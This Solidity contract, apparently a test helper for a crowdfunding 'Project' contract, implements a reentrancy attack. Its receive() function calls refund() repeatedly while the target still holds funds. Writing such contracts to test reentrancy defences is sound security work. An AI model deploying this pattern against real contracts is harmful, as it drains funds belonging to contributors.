// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "../Project.sol";

contract AttackingProject {
    Project public project;

    constructor(address payable _project) payable {
        project = Project(_project);
    }

    receive() external payable {
        if (address(project).balance > 0) {
            project.refund();
        }
    }

    function contribute() external payable {
        project.contribute{value: msg.value}();
    }

    function reentrantRefund() external {
        project.refund();
    }
}
